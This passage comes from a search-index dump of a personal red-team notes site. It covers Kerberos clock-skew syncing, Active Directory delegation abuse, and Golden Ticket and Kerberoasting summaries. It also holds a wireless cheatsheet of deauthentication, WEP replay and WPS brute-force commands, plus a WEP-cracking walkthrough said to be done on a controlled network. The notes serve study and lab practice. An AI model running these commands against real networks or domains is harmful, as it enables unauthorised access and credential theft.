\"clock-skew\" | head -n1 | sed 's/mean: //g; s/,//g' | cut -d' ' -f2 | sed 's/d/ days /g; s/h/ hours /g; s/m/ minutes /g; s/s$/ seconds/g')\n\nif [[ ! -z $CLOCK_SKEW ]]\nthen\n    # Account for weird negative logic\n    if [[ ! -z \"$(echo $CLOCK_SKEW | grep '^-')\" ]]\n    then\n        CLOCK_SKEW=$(echo $CLOCK_SKEW | sed 's/ \\([0-9]\\)/ -\\1/g')\n    fi\n    echo \" o  Clock Skew: $CLOCK_SKEW\"\n\n    echo \" o  NTP disabled.\"\n    sudo timedatectl set-ntp false\n\n    echo \" o  Updating your local clock (this might cause any VPN/remote application to restart or crash).\"\n    sudo date --set=\"$CLOCK_SKEW\"\nelse\n    echo \"[!] Failed to fetch clock skew! Try \\\"rdate -n $1\\\" for NTP.\"\nfi\n</code></pre> <p>To undo the synchronization, run the following command: <pre><code>timedatectl set-ntp true\n</code></pre></p>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/Delegation/","title":"Delegation","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/Delegation/#what-is-delegation","title":"What is Delegation?","text":"<p>Delegation allows a system to store the TGT of an account that authenticates to it in its memory, then request access to specified resources within the domain on behalf of the end-user that has authenticated to it.</p> <p>Why does this exist? It allows applications to access resources hosted elsewhere on behalf of users, without having to allow said application full unfettered access to the backend resource.  An example of this would be a public facing web server having delegation rights to a backend SQL server. The web server does NOT have access to the SQL database, however the web server can request access to the database on behalf of a logged on user.  This allows the user to access the data they're provisioned to within the SQL database (without ever touching the database itself), while also making sure the web server account doesn't have unrestricted access to the database.</p>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/Delegation/#types-of-delegation","title":"Types of Delegation","text":"<p>To help aid in understanding, the following terms/variables will be used in examples:</p> Name Description $Bobby Authenticated user to be impersonated. $DelegServer Application with a type of delegation (e.g., www/server1.domain). $Resource Domain resource being accessed / delegated to (e.g., mssql/server2.domain)."},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/Delegation/#unconstrained-delegation","title":"Unconstrained Delegation","text":"<p>Unconstrained Delegation rights allow a service to authenticate on a user's behalf to any service or system within the entire domain without restrictions, which means that it has broad, unconstrained access.</p> <ul> <li>Example: <ul> <li>$Bobby authenticates to $DelegServer, and his TGT is stored in $DelegServer's memory.  Depending on what rights $Bobby has, $DelegServer can access any $Resource within the domain on his behalf. </li> </ul> </li> <li>Tip:<ul> <li>The tool SpoolSample.exe can force a Domain Controller (DC) computer account to authenticate to any other AD computer. This means if an attacker has access to a system with Unconstrained Delegation, using SpoolSample.exe they can delegate to any system in the network as the DC (i.e., Domain Admin).</li> </ul> </li> <li>Attributes:<ul> <li>UserAccountControl: TRUSTED_FOR_DELEGATION</li> </ul> </li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/Delegation/#constrained-delegation","title":"Constrained Delegation","text":"<p>Constrained Delegation rights restrict delegation by specifying which services can be delegated to within the domain, allowing a service to authenticate on a user's behalf to only the services explicitly configured (e.g., delegation rights ONLY to mssql/server2.domain).</p> <ul> <li>Example: <ul> <li>$DelegServer can request a ST for $Bobby (or ANY user not marked as 'Sensitive') without needing their TGT stored in memory, and subsequently ser to specified $Target.</li> </ul> </li> <li>Tip:<ul> <li>Bruh</li> </ul> </li> <li>Attributes:<ul> <li>UserAccountControl: TRUSTED_FOR_DELEGATION</li> <li>msDS-AllowedToDelegateTo: Contains the SPN of $Resource</li> </ul> </li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/Delegation/#resource-based-constrained-delegation-rbcd","title":"Resource-Based Constrained Delegation (RBCD)","text":"<p>Resource-Based Constrained Delegation rights further refines the scope of delegation by allowing a service to authenticate on a user's behalf to only the specific resources on systems explicitly configured (e.g., CIFS access on a specific Domain Computer).</p> <ul> <li>Example: <ul> <li>Bruh</li> </ul> </li> <li>Tip:<ul> <li>Bruh</li> </ul> </li> <li>Attributes:<ul> <li>msDS-AllowedToActOnBehalfOfOtherIdentity: Contains the SPN of a $DelegServer</li> </ul> </li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/Delegation/#delegation-spark-notes-ugly","title":"Delegation Spark Notes (Ugly)","text":"<pre><code># Helper Variables\n$Deleg  = Application with a type of delegation\n$User   = User to be impersonated\n$Target = Domain resource being delegated to\n\n# Unconstrained Delegation\n- Description: a system with unconstrained delegation can impersonate an authenticated user to ANY service in the domain.\n- $Deleg UAC Attribute: TRUSTED_FOR_DELEGATION\n- Usage: $User authenticates to $Deleg, and their TGT is stored in $Deleg memory. $Deleg can now impersonate $User to any $Target in the domain.\n- Tips: SpoolSample.exe can force a DC to authenticate to any AD computer, meaning a DC computer TGT can be acquired (i.e., Domain Admin privs).\n\n# Constrained Delegation\n- Description: a system with constrained delegation can impersonate an authenticated user to only a specified service in the domain (e.g., www/server1.domain).\n- $Deleg UAC Attribute: TRUSTED_TO_AUTH_FOR_DELEGATION\n- $Deleg msDS-AllowedToDelegateTo: Contains SPN of $Target\n- Usage: $Deleg can request a ST for any $User (not marked as 'Sensitive') and impersonate them to specified $Target.\n- Tips: Specified service can be changed to any service on the $Target computer object (e.g., www/server1.domain changed to cifs/server1.domain).\n\n# Resource-Based Constrained Delegation (RBCD)\n- Description: a target service uses RBCD to specify which system is allowed to delegate to it (inverse of prior delegation types).\n- $Target msDS-AllowedToActOnBehalfOfOtherIdentity: Contains SPN of any system to act as $Deleg\n- Usage: $Target has set $Deleg to be allowed to delegate to it.$Deleg can request a ST for any $User (not marked as 'Sensitive') and impersonate them to $Target.\n- Tips: Unprivileged users with ms-DS-MachineAccountQuota attribute set above 0 (default: 10) can create a new domain computer account with an SPN.\n</code></pre>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/Delegation/#exploitation","title":"Exploitation","text":"<p>Info</p> <p>WIP</p> <pre><code># Constrained Delegation\n\n# Query DC for User/Computer Accounts with Constrained Delegation\nGet-DomainUser -TrustedToAuth 2&gt;$NULL\nGet-DomainComputer -TrustedToAuth 2&gt;$NULL\n</code></pre>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/Golden%20Ticket%20Attack/","title":"Golden Ticket Attack","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/Golden%20Ticket%20Attack/#tldr","title":"TL;DR","text":"<p>A Golden Ticket attack is post-exploitation attack where a compromised and extracted KRBTGT account hash is used to forge Ticket-Granting-Tickets (TGTs), allowing unfettered access to the domain.</p>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/Kerberoasting/","title":"Kerberoasting","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Exploitation/Kerberoasting/#tldr","title":"TL;DR","text":"<p>Kerberoasting is a post-exploitation attack technique that attempts to obtain a password hash of an Active Directory account that has a Service Principal Name (\u201cSPN\u201d), which happens to be all domain service accounts by design.  </p> <p>Any user with a valid TGT and permission to access the service can request a Service Ticket for any service with an SPN.  This Service Ticket is signed with the NTLM password hash of the service account, which attackers can then crack the encrypted passwords offline to gain unauthorized access.</p> <p>Once the plaintext credentials of the service account are obtained, the adversary can impersonate the account owner and inherit access to any systems, assets or networks granted to the compromised account.</p>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Authentication%20Overview/","title":"Authentication Overview","text":"<p>Info</p> <p>This note is still in development.</p> <p>Before reading, make sure you are familiar with Kerberos components and their correlated acronyms.  Please reference the Component Overview for an overview.</p>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Authentication%20Overview/#bluf","title":"BLUF","text":"<ul> <li>Kerberos uses a series of symmetric keys for user authentication.<ul> <li>Shared Key 1: User's NTLM hash between the end-user and Authentication Service (AS).</li> <li>Shared Key 2:  KRBTGT NTLM hash between the Authentication Service (AS) and Ticket-Granting-Service (TGS).</li> <li>Shared Key 3: Service's NTLM hash between the Ticket-Granting-Service (TGS) and the target service.</li> </ul> </li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Authentication%20Overview/#order-of-operations","title":"Order of Operations","text":"<ol> <li>Requesting a Ticket Granting Ticket (TGT) from the Authentication Service (AS)<ul> <li>AS-REQ: User requests Ticket-Granting-Ticket (TGT) by encrypting a timestamp with the NTLM hash of the requested user, and sends it to the Authentication Service (AS).</li> <li>AS-REP: The AS returns a TGT encrypted with the KRBTGT hash if it can successfully decrypt the timestamp using the requested user's NTLM hash that's stored in AD and if the timestamp is accurate.</li> </ul> </li> <li>Requesting a Service Ticket (ST) from the Ticket Granting Service (TGS)<ul> <li>TGS-REQ: Authenticated user requests a Service Ticket (ST) to access a service by sending their TGT and the target service's Service Principal Name (SPN) to the Ticket Granting Service (TGS).</li> <li>TGS-REP: The TGS returns a ST encrypted with the target service account's NTLM hash if the TGT is valid and if the requesting user has permissions to access the target service.</li> </ul> </li> <li>Accessing a Service<ul> <li>AP-REQ: Authenticated user requests access to the target service by providing it the ST.</li> <li>AP-REP: Target service allows access if the ST is successfully decrypted using the service account's NTLM hash.</li> </ul> </li> </ol>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Authentication%20Overview/#protocol-breakdown","title":"Protocol Breakdown","text":""},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Authentication%20Overview/#visual-diagram","title":"Visual Diagram","text":""},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Authentication%20Overview/#tgt-requestsresponses","title":"TGT Requests/Responses","text":""},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Authentication%20Overview/#as-req-w-preauth","title":"AS-REQ (w/ PREAUTH):","text":"<ul> <li>Request for a Ticket-Granting-Ticket (TGT), containing the user's User Principal Name (UPN) and a timestamp that is encrypted with the client's key (aka user's NTLM hash).<ul> <li>Sent from Client to Authentication Service (AS)</li> <li>The encrypted timestamp is PREAUTH portion.</li> <li>Shared Key:<ul> <li>Key: the user's NTLM hash</li> <li>Shared Between: Client and the Authentication Service (AS)</li> </ul> </li> </ul> </li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Authentication%20Overview/#as-rep-w-preauth","title":"AS-REP (w/ PREAUTH):","text":"<ul> <li>A Ticket-Granting-Ticket (TGT) is returned that is encrypted with the KRBTGT hash and signed with the client's key IF the PREAUTH is validated.<ul> <li>Sent from Authentication Service (AS) to Client</li> <li>A TGT is returned after validation is done, by decrypting the timestamp with the NTLM hash stored in the Kerberos Database (AD) for that specific UPN.</li> <li>Shared Key:<ul> <li>Key: the KRBTGT NTLM hash</li> <li>Shared Between: AS and the Ticket-Granting-Service (TGS)</li> </ul> </li> </ul> </li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Authentication%20Overview/#as-req-wo-preauth","title":"AS-REQ (w/o PREAUTH):","text":"<ul> <li>Request for a Ticket-Granting-Ticket (TGT), containing only the user's User Principal Name (UPN).<ul> <li>Sent from Client to Authentication Service (AS)</li> <li>Shared Key:<ul> <li>Key: n/a</li> <li>Shared Between: n/a</li> </ul> </li> </ul> </li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Authentication%20Overview/#as-rep-wo-preauth","title":"AS-REP (w/o PREAUTH):","text":"<ul> <li>A Ticket-Granting-Ticket (TGT) is returned that is encrypted with the KRBTGT hash and signed with the client's key WITHOUT validating any PREAUTH.<ul> <li>Sent from Authentication Service (AS) to Client</li> <li>A TGT is returned for that specific UPN without authentication.</li> <li>Shared Key:<ul> <li>Key: the KRBTGT NTLM hash</li> <li>Shared Between: AS and the Ticket-Granting-Service (TGS)</li> </ul> </li> </ul> </li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Authentication%20Overview/#tgs-requestsresponses","title":"TGS Requests/Responses","text":""},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Authentication%20Overview/#tgs-req","title":"TGS-REQ","text":"<ul> <li>TBD</li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Authentication%20Overview/#tgs-rep","title":"TGS-REP","text":"<ul> <li>TBD</li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Authentication%20Overview/#pre-authentication","title":"Pre-Authentication","text":"<p>Example Authentication for a Client to access a Network File Service</p> <p></p> <p>(1) AS-REQ: - Client sends authentication request to Authentication Service (AS), which is partially encrypted with their password used as the secret key.</p> <p></p> <p>(2) AS-REP: - Authentication Service (AS) verifies client authentication by referencing the Kerberos Database for the the requested user's secret key.  If that secret key exists in the Kerberos Database and successfully decrypts the authentication request, the AS returns a Ticket-Granting-Ticket (TGT)  which is encrypted with a key shared between the AS and the Ticket-Granting-Service (TGS).</p> <p></p> <p>(3)  TGS-REQ: - TBA</p>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Component%20Overview/","title":"Component Overview","text":"<p>Info</p> <p>This note is still in development.</p>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Component%20Overview/#key-distribution-center","title":"Key Distribution Center","text":"<ul> <li>The Key Distribution Center (KDC) is the primary component for authentication within Active Directory, and is generally running on Domain Controller(s) as part of Active Directory Domain Services (AD DS).</li> <li>The KDC contains the following components:<ul> <li>Authentication Service (AS)</li> <li>Ticket Granting Service (TGS)</li> <li>Kerberos Database (aka Active Directory)</li> </ul> </li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Component%20Overview/#authentication-service","title":"Authentication Service","text":"<ul> <li>The Authentication Service (AS) is the primary service that handles initial user authentication and the distribution of Ticket-Granting-Tickets (TGT).</li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Component%20Overview/#ticket-granting-service","title":"Ticket-Granting-Service","text":"<ul> <li>The Ticket-Granting-Service (TGS)...</li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Component%20Overview/#kerberos-database","title":"Kerberos Database","text":"<ul> <li>The Kerberos Database (aka Active Directory)...</li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Component%20Overview/#tickets","title":"Tickets","text":"<p>Kerberos works using a ticketing system for authentication rather than users supplying credentials for each service they want to access.  The ticketing system can be broken down into the following components:</p>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Component%20Overview/#ticket-granting-ticket-tgt","title":"Ticket-Granting-Ticket (TGT)","text":"<ul> <li>Ticket granted Clients by the Authentication Service (AS) to authenticate them, and used to request Service Tickets from the Ticket Granting Service (TGS).<ul> <li>Ticket encrypted with a symmetric key (aka KRBTGT hash) only known between the Authentication Service (AS) and Ticket Granting Service (TGS).</li> <li>Encrypted ticket is signed with Client's shared key (aka user's NTLM hash)</li> </ul> </li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Component%20Overview/#service-ticket-st","title":"Service Ticket (ST)","text":"<ul> <li>Ticket granted to authenticated Clients by the Ticket Granting Service (TGS) to allow access to Domain Services.<ul> <li>Requested with the authenticated client's Ticket-Granting-Ticket (TGT) and Service Principal Name (SPN) of the desired Domain Service.</li> <li>Ticket is signed with the NTLM hash of the target Service Account.</li> </ul> </li> </ul>"},{"location":"Red%20Cell/01.%20Active%20Directory%20%28AD%29/Kerberos%20Overview/Component%20Overview/#service-principal-name-spn","title":"Service Principal Name (SPN)","text":"<ul> <li>Given to all Domain Service Accounts (e.g., IIS, MSSQL) to associate them with a login account.<ul> <li>When a user wants to access a service with an SPN, they receive a Kerberos Service Ticket signed with the NTLM password hash of the account running that service.</li> <li>Any user with a valid TGT and permission to access the service can request a Service Ticket for any service with an SPN.</li> </ul> </li> </ul>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/","title":"IEEE 802.11 (Wireless LAN)","text":"<ul> <li>IEEE 802.11, commonly known as Wi-Fi, is a set of standards for wireless local area networks (LANs) that facilitate wireless communication between devices, enabling wireless internet access and local network connections.</li> </ul>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/#table-of-contents","title":"Table of Contents","text":""},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/#tools","title":"Tools","text":"<ul> <li>Network Connections via WPA_Supplicant</li> <li>Wireless Cheatsheet</li> </ul>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/#walkthroughs","title":"Walkthroughs","text":"<ul> <li>Cracking WEP Networks</li> <li>Cracking WPA2-EAP Networks (Enterprise)</li> <li>Cracking WPA2-PSK Networks (Personal)</li> <li>Cracking WPS Networks</li> </ul>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Tools/Network%20Connections%20via%20WPA_Supplicant/","title":"Network Connections via WPA Supplicant","text":""},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Tools/Network%20Connections%20via%20WPA_Supplicant/#wpa_supplicant","title":"WPA_Supplicant","text":"<p>Usage Syntax <pre><code># Connect to wireless network via CLI\nsudo wpa_supplicant -i &lt;wlan_interface&gt; -c wifi-client.conf\n\n# Renew DHCP after connecting to network\nsudo dhclient &lt;wlan_interface&gt;\n</code></pre></p>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Tools/Network%20Connections%20via%20WPA_Supplicant/#network-configuration-files","title":"Network Configuration Files","text":""},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Tools/Network%20Connections%20via%20WPA_Supplicant/#wpa2-psk-configuration","title":"WPA2-PSK Configuration","text":"<pre><code># wifi-client.conf\nnetwork={\n  scan_ssid=1\n  ssid=\"&lt;ssid&gt;\"\n  psk=\"&lt;passphrase&gt;\"\n  key_mgmt=WPA-PSK\n}\n</code></pre>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Tools/Network%20Connections%20via%20WPA_Supplicant/#wpa2-mgt-configuration","title":"WPA2-MGT Configuration","text":"<pre><code># wifi-client.conf\nnetwork={\n  ssid=\"&lt;ssid&gt;\"\n  identity=\"&lt;domain&gt;\\&lt;user&gt;\"\n  password=\"&lt;passphrase&gt;\"\n  scan_ssid=1\n  eap=PEAP\n  key_mgmt=WPA-EAP\n  phase1=\"peaplabel=0\"\n  phase2=\"MSCHAPV2\"\n}\n</code></pre>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Tools/Network%20Connections%20via%20WPA_Supplicant/#wep-configuration","title":"WEP Configuration","text":"<pre><code># wifi-client.conf\nnetwork={\n  ssid=\"&lt;ssid&gt;\"\n  scan_ssid=1\n  key_mgmt=NONE\n  wep_tx_keyidx=0\n  wep_key0=&lt;network_key&gt;\n}\n</code></pre>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Tools/Wireless%20Cheatsheet/","title":"Wireless Cheatsheet","text":""},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Tools/Wireless%20Cheatsheet/#wi-fi-drivers","title":"Wi-Fi Drivers","text":"<pre><code># View Current WiFi Driver\nsudo airmon-ng\nnmcli # if PCI device\nlsusb # if USB device\n\n# List Driver Info and Params\nsudo modinfo &lt;driver&gt;\n# Modify Driver Parameters\nsudo modprobe &lt;driver&gt; &lt;param&gt;=&lt;value&gt;\n\n# List Loaded Kernel Modules\nlsmod\n# Remove Kernel Module / Dependencies\nsudo rmmod &lt;driver&gt; # Might need to specify dependencies if an error returns\n</code></pre>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Tools/Wireless%20Cheatsheet/#wireless-tools","title":"Wireless Tools","text":"<pre><code># Return detailed wireless interface information\nsudo iw list\n\n# Scan for Wi-Fi signals on a specified interface\nsudo iw dev &lt;dev&gt; scan # | grep \"SSID:|DS Parameter set:\"\n\n# Add a separate monitor mode interface based on an existing interface\nsudo iw dev &lt;interface&gt; interface add &lt;monitor_name&gt; type monitor\n# Bring new interface up\nsudo ip link set &lt;monitor_name&gt; up\n# Get information on new interface\nsudo iw dev &lt;monitor_name&gt; info\n# Sniff traffic new monitor interface\nsudo tcpdump -i &lt;monitor_name&gt;\n# Delete monitor interface\nsudo iw dev &lt;monitor_name&gt; interface del\n\n# Get Current Wi-Fi Regulatory Domain\nsudo iw reg get\n# Set Wi-Fi Regulatory Domain (Volatile / In-Memory)\nsudo iw reg set US\n# Set Wi-Fi Regulatory Domain (Persistent)\nsudo nano /etc/default/crda # example: REGDOMAIN=US\n\n# List RF Devices\nsudo rfkill list\n# Soft Block Management\nsudo rfkill block &lt;device_id&gt;\nsudo rfkill unblock &lt;device_id&gt;\n</code></pre>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Tools/Wireless%20Cheatsheet/#air-suite","title":"Air- Suite","text":"<pre><code># See available networks/channels\nsudo airodump-ng &lt;mon_interface&gt;\n# Specify channel to hone in on a target network and output to file\nsudo airodump-ng --bssid &lt;target_bssid&gt; -c &lt;channel&gt; --write &lt;outfile&gt; &lt;mon_intercace&gt;\n### New Terminal ###\n# See if network interface can communicate with target\nsudo aireplay-ng -9 -a &lt;target_bssid&gt; &lt;mon_interface&gt;\n# If successful, you should be able to inject/deauth\nsudo aireplay-ng --deauth 100 -a &lt;target_bssid&gt; &lt;mon_interface&gt;\n\n### AIRCRACK ###\nsudo aircrack-ng\n# 0 ## Deauthentication\n# 1 ## Fake Authentication\n# 2 ## Interactive Packet Replay\n# 3 ## ARP Request Replay Attack\n# 4 ## KoreK ChopChop Attack\n# 5 ## Fragmentation Attack\n# 6 ## Cafe\u0301-Latte Attack\n# 7 ## Client-Oriented Fragmentation Attack\n# 9 ## Injection Test\n</code></pre>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Tools/Wireless%20Cheatsheet/#wep-cracking","title":"WEP Cracking","text":"<pre><code># Fake Authentication Attack\naireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt; #\n\n# Deauthentication Attack\naireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;\n\n### ARP Request Replay Attack\naireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;\naireplay-ng -3 -b &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt; ### ARP Request ###\naireplay-ng -0 1 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; &lt;interface&gt;\n\n## Interactive Packet Replay Attack\naireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP_MAC&gt; -h &lt;Your_MAC&gt; &lt;interface&gt;\naireplay-ng -2 -b &lt;AP_MAC&gt; -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 &lt;interface&gt;\n\n### Fragmentation Attack\naireplay-ng -1 0 -e &lt;ESSID&gt; -a &lt;AP_MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;\naireplay-ng -5 -b &lt;AP_MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;\n\n## Korek ChopChop Attack\n\n## Bypassing WEP Shared Key Authentication\n</code></pre>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Tools/Wireless%20Cheatsheet/#wps-cracking","title":"WPS Cracking","text":"<pre><code># Query for networks with WPS support\nsudo wash -i &lt;mon_interface&gt;\n\n# Bruteforce a target WPS Network\nsudo reaver -b &lt;bssid&gt; -c &lt;channel&gt; -i wlan0mon -v\n\n# Bruteforce a target WPS Network with PixieWPS (faster)\nsudo reaver -b &lt;bssid&gt; -c &lt;channel&gt; -i wlan0mon -v -K\n</code></pre>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Walkthroughs/Cracking%20WEP%20Networks/","title":"Cracking WEP Networks","text":"<p>Info</p> <p>This was performed on a controlled network, meaning everything performed was both legal and ethical.</p> <p>This walkthrough does not contain in-depth explanations of every tool used.  For references to the tools used, see my Wireless Cheatsheet.</p>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Walkthroughs/Cracking%20WEP%20Networks/#overview","title":"Overview","text":"<p>WEP (Wired Equivalent Privacy) is an outdated and insecure wireless network security protocol that was was introduced as a standard early on in Wi-Fi's lifecycle, but has since been deprecated and replaced by more secure methods.</p> <p>Like WPA2-PSK, WEP uses a single shared key for authentication.  However, it uses much weaker encryption and relies on small Initialization Vectors (IVs) to be combined with the secret key in order to encrypt data that\u2019s about to be transmitted. Because the IV's are only 24-bit (which is quite small) they end up being re-used with the same key, and since IV keys are transferred with the data in plaintext so that the receiving party is able to decrypt the communication, an attacker can capture these IVs.</p> <p>By capturing enough repeating IVs, an attacker can easily crack the WEP secret key because they\u2019re able to make sense of the encrypted data, and they\u2019re able to decrypt the secret key.</p>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Walkthroughs/Cracking%20WEP%20Networks/#generating-capturing-ivs","title":"Generating &amp; Capturing IVs","text":"<pre><code># View Current WiFi Driver\nsudo airmon-ng\n# Create Monitor Interface\nsudo airmon-ng start &lt;interface&gt;\n</code></pre> <p>With the monitor interface configured, next I began sniffing the network to find what networks are available.</p> <p><pre><code># See available networks/channels/security\nsudo airodump-ng &lt;mon_interface&gt;\n</code></pre> (In this case, my monitor interface is wlan0mon)</p> <p></p> <p>This revealed the SSID of the WEP network, that it's on channel 3, and that the MAC address is \"02:13:37:BE:EF:03\".</p> <p>With this knowledge, I restarted my \"airodump\" listener, refining it to focus specifically on the target network.</p> <p><pre><code># Capture wireless traffic to a file\nsudo airodump-ng --bssid \"02:13:37:BE:EF:03\" -c 3 --write \"&lt;network_ssid&gt;\" wlan0mon\n</code></pre> (By specifying '--write', all traffic will be dumped into a file we can reference later.)</p> <p>With my listener capturing network traffic, I needed to collect a large enough quantity of network initialization vectors (IVs) to crack the passphrase.  To do this, I performed a handful of replay attacks on the network.  The below screenshot shows approximately 30 IVs -- in order to crack the network key, I ideally wanted to get this number well into the thousands.  </p> <p></p> <p>The attacks I utilized to increase IV quantity during this scenario were: - Fake Authentication Attack - Fragmentation Attack - ARP Request Replay Attack</p> <pre><code># Fake Authentication Attack with monitor interface MAC\nsudo aireplay-ng --fakeauth 0 -a \"02:13:37:BE:EF:03\" -h \"20:00:00:00:00:00\" wlan0mon\n\n# Fragmentation Attack with monitor interface MAC\nsudo aireplay-ng --fragment -b \"02:13:37:BE:EF:03\" -h \"20:00:00:00:00:00\" wlan0mon\n\n# ARP Request Replay Attack with authenticated client MAC\nsudo aireplay-ng --arpreplay -b \"02:13:37:BE:EF:03\" -h \"20:00:00:00:03:00\" wlan0mon\n</code></pre> <p> </p> <p>After some time, I eventually got the IV count to near 100,000.  This was more than enough to crack the network key.</p> <p></p>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Walkthroughs/Cracking%20WEP%20Networks/#cracking-the-passphrase","title":"Cracking the Passphrase","text":"<p>To crack the key, I utilized \"aircrack-ng\" and pointed it to my network capture file containing all the IV's in order to conduct a WEP key attack.</p> <pre><code># WEP Key Attack\nsudo aircrack-ng ./&lt;network_ssid&gt;-01.cap\n</code></pre> <p></p> <pre><code># Network Key\n2E:2C:F0:E3:FF\n</code></pre>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Walkthroughs/Cracking%20WPA2-EAP%20Networks%20%28Enterprise%29/","title":"Cracking WPA2 EAP Networks (Enterprise)","text":"<p>Info</p> <p>This was performed on a controlled network, meaning everything performed was both legal and ethical.</p> <p>This walkthrough does not contain in-depth explanations of every tool used.  For references to the tools used, see my Wireless Cheatsheet.</p>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Walkthroughs/Cracking%20WPA2-EAP%20Networks%20%28Enterprise%29/#overview","title":"Overview","text":"<p>WPA2-EAP (also known as WPA-Enterprise) is a much more secure and scalable method of Wi-Fi network security compared to WPA2-PSK.  This type of Wi-Fi is more commonly found in large scale businesses and enterprise environments.</p> <p>This form of Wi-Fi security utilizes EAP (Extensible Authentication Protocol) and a RADIUS (Remote Authentication Dial-in User Service) server for more robust and secure authentication; each user or device must authenticate individually, typically using a username and password or other credentials (such as digital certificates).</p> <p>This means for authentication, a bad actor can't just capture the handshake between an end-user and the network.  Rather, the actor also needs to have end users mistakenly authenticate to them so that the users' credentials can be cracked and used for authentication.</p>"},{"location":"Red%20Cell/02.%20IEEE%20802.11%20%28Wireless%20LAN%29/Walkthroughs/Cracking%20WPA2-EAP%20Networks%20%28Enterprise%29/#capturing-the-wpa-handshake","title":"Capturing the WPA 